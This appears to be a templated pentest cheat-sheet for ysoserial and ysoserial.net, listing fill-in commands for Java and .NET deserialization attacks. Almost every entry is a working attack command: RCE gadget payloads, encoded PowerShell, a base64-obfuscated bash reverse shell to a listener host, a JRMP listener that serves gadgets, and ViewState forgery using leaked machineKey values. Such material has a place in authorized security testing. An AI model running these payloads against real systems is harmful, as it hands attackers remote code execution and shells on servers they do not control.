# ysoserial

> Generates Java and .NET deserialization gadget-chain payloads for RCE.

<!-- tags: web, deserialization, java, dotnet, rce, exploit -->

---

## list gadgets ysoserial
List every available Java gadget chain ysoserial can generate.

```bash
java -jar ysoserial.jar
```

<!-- meta: risk=safe | phase=recon | tags=gadgets,list,java -->

---

## generate gadget commonscollections ysoserial
Generate a CommonsCollections Java payload that runs a command.

```bash
java -jar ysoserial.jar {{GADGET:str:CommonsCollections1}} "{{CMD:str:id}}" > {{OUTFILE:file:payload.bin}}
```

<!-- meta: risk=critical | phase=exploit | tags=java,commonscollections,rce -->

---

## generate gadget powershell ysoserial
Generate a Java payload that runs an encoded PowerShell command.

```bash
java -jar ysoserial.jar {{GADGET:str:CommonsCollections1}} "powershell.exe -EncodedCommand {{B64CMD:str:BASE64}}" > {{OUTFILE:file:payload.bin}}
```

<!-- meta: risk=critical | phase=exploit | tags=java,powershell,windows,rce -->

---

## encode powershell utf16le ysoserial
Encode a PowerShell script as one-line UTF-16LE base64 for -EncodedCommand.

```bash
iconv -f ASCII -t UTF-16LE {{SCRIPT_FILE:file:payload.ps1}} | base64 | tr -d "\n"
```

<!-- meta: risk=safe | phase=exploit | tags=powershell,encode,base64 -->

---

## generate gadget reverse shell ysoserial
Generate a Java gadget payload that spawns a reverse shell via bash.

```bash
java -jar ysoserial.jar {{GADGET:str:CommonsCollections5}} 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC97e0xIT1NUOmlwOjEwLjAuMC4xfX0ve3tMUE9SVDpwb3J0OjQ0NDR9fSAwPiYx}|{base64,-d}|{bash,-i}' > {{OUTFILE:file:revshell.bin}}
```

<!-- meta: risk=critical | phase=exploit | tags=java,reverseshell,rce -->

---

## generate gadget url base64 ysoserial
Generate a Java payload and base64-encode it for embedding in HTTP requests.

```bash
java -jar ysoserial.jar {{GADGET:str:CommonsCollections6}} "{{CMD:str:id}}" | base64 -w0
```

<!-- meta: risk=critical | phase=exploit | tags=java,base64,http -->

---

## generate gadget urldns ysoserial
Generate a URLDNS payload to detect deserialization via an out-of-band DNS hit.

```bash
java -jar ysoserial.jar URLDNS "http://{{URL:str:CALLBACK.oast.online}}" > {{OUTFILE:file:urldns.bin}}
```

<!-- meta: risk=low | phase=enum | tags=java,urldns,oob,detection -->

---

## generate gadget jrmp ysoserial
Generate a JRMPClient payload pointing at a JRMPListener for RMI exploitation.

```bash
java -jar ysoserial.jar JRMPClient "{{LHOST:ip:10.0.0.1}}:{{LPORT:port:1099}}" > {{OUTFILE:file:jrmp.bin}}
```

<!-- meta: risk=critical | phase=exploit | tags=java,jrmp,rmi -->

---

## start jrmp listener ysoserial
Run ysoserial's JRMP listener to deliver a gadget to a connecting JRMPClient.

```bash
java -cp ysoserial.jar ysoserial.exploit.JRMPListener {{LPORT:port:1099}} {{GADGET:str:CommonsCollections1}} "{{CMD:str:id}}"
```

<!-- meta: risk=critical | phase=exploit | tags=java,jrmp,listener -->

---

## list gadgets ysoserial.net
List available .NET formatters and gadget chains in ysoserial.net.

```bash
ysoserial.exe --fullhelp
```

<!-- meta: risk=safe | phase=recon | tags=dotnet,gadgets,list -->

---

## generate gadget objectdataprovider ysoserial.net
Generate a Json.Net ObjectDataProvider .NET payload that runs a command.

```bash
ysoserial.exe -f {{FORMATTER:str:Json.Net}} -g {{GADGET:str:ObjectDataProvider}} -o raw -c "{{CMD:str:calc.exe}}" -t
```

<!-- meta: risk=critical | phase=exploit | tags=dotnet,json.net,objectdataprovider,rce -->

---

## generate gadget viewstate ysoserial.net
Forge an ASP.NET __VIEWSTATE payload using leaked machineKey values.

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -EncodedCommand {{B64CMD:str:BASE64}}" --path="{{PARAM:str:/app/page.aspx}}" --apppath="{{APPPATH:str:/}}" --decryptionalg="3DES" --decryptionkey="{{DECKEY:str:DECRYPTION_KEY}}" --validationalg="SHA1" --validationkey="{{VALKEY:str:VALIDATION_KEY}}"
```

<!-- meta: risk=critical | phase=exploit | tags=dotnet,viewstate,aspnet,machinekey,rce -->
